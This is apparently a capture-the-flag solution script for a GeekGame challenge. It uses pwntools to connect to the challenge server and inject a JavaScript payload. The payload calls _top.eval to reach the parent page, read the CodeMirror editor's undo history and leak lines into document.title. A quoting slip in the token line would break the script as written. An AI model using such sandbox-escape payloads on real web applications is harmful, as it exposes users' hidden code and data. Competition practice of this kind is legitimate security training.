from pwn import *

sh = remote('prob03.geekgame.pku.edu.cn', 10003)

sh.sendlineafter('token:', 'It's MyToken!!!!!')

sh.sendafter('"EOF")', """

_top.eval("for (c of document.querySelector('.CodeMirror').CodeMirror.getHistory().done) {if ('changes' in c){for (change of c.changes) {console.log(change.text);if (change.text[0].startsWith('console')) {document.title = change.text;}}}}");

EOF
""")

sh.sendlineafter('nodejs):', '1')

print(sh.recvall())